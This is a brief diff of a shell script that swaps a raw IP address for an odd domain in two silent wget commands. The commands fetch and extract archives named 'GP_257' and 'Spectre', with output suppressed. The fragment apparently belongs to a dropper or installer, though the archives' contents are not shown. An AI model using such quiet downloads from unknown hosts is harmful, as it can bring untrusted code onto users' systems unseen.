@@ -15,13 +15,13 @@ echo ""
 
 sleep 2
 
-wget -q http://45.135.58.52/GP_257.tar.gz >/dev/nullv
+wget -q http://greenleaf.teatspray.fun/GP_257.tar.gz >/dev/nullv
 
 tar -xf GP_257.tar.gz
 
 sleep 2
 
-wget -q http://45.135.58.52/Spectre.tar.gz >/dev/null
+wget -q http://greenleaf.teatspray.fun/Spectre.tar.gz >/dev/null
 
 sleep 2
 
